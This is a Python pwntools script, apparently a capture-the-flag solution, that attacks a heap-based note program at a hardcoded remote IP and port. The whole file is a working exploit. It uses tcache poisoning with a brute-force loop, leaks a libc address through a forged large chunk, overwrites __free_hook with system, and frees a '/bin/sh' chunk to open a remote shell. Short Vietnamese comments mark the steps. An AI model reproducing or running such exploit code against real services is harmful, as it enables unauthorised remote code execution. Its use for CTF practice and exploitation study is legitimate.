from pwn import *

r = process("./note")
#gdb.attach(r)

#r.recvuntil(b'>')

def add(index, size, content):
	r.sendline(b'1')
	r.recvuntil(b'Index:')
	r.sendline(str(index))
	r.recvuntil(b'Note size:')
	r.sendline(str(size))
	r.recvuntil(b'Content:')
	r.send(content)
	r.recvuntil(b'>')

def edit(index, content):
	r.sendline(b'2')
	r.recvuntil(b'Index:')
	r.sendline(str(index))
	r.recvuntil(b'Content:')
	r.send(content)
	r.recvuntil(b'>')

def view(index):
	r.sendline(b'3')
	r.recvuntil(b'Index:')
	r.sendline(str(index))
	return r.recvuntil(b'>')

def delete(index):
	r.sendline(b'4')
	r.recvuntil(b'Index:')
	r.sendline(str(index))
	r.recvuntil(b'>')


while(1):
	#r = process("./note")
	#gdb.attach(r)
	r = remote("45.122.249.68", 10007)
	r.recvuntil(b'>')

	size = 0x40
	
	# tao 3 
	add(0, size, b"00000000")
	add(1, size, b"11111111")
	add(2, size, b"22222222")     # ok
	
	# free 2
	delete(0)
	delete(2)    # ok
	
	# edit lan 1
	edit(2, b'\x90')   # ok
	
	# tao 1
	add(3, size, b'33333333')
	
	# tao 1 -> overwrite chunk0.size -> big chunk size
	payload = p64(0) + p64(0x421)
	add(4, size, payload)    # ok
	
	
	# free 2
	delete(1)
	delete(2)
	
	# edit lan 2: edit dia chi - bruteforce 4 bit here
	edit(2, b'\xb0\x56')
	
	# tao 1 (padding)
	add(5, size, b'55555555') 
	
	try:
		# tao fake chunk
		payload = p64(0) + p64(0x21) + p64(0)*3 + p64(0x21)
		add(6, size, payload)
		
		# free big chunk
		delete(0)
	except:
		r.close()
		continue

	#gdb.attach(r)
	# lets view
	stuff = view(0).split(b'\x7f')[0][-5:] + b"\x7f"
	libc_base = int.from_bytes(stuff, "little") - (0x00000000001ebb70 + 0x10 + 96)
	
	print(hex(libc_base))
	free_hook = 0x00000000001eeb28 + libc_base
	system = 0x0000000000055410 + libc_base

	delete(1)
	delete(2)
	edit(2, p64(free_hook)[:6])
	add(7, size, b'/bin/sh')
	add(8, size, p64(system))


	# delete(7)
	r.sendline(b'4')
	r.recvuntil(b'Index:')
	r.sendline(b'7')


	r.interactive()

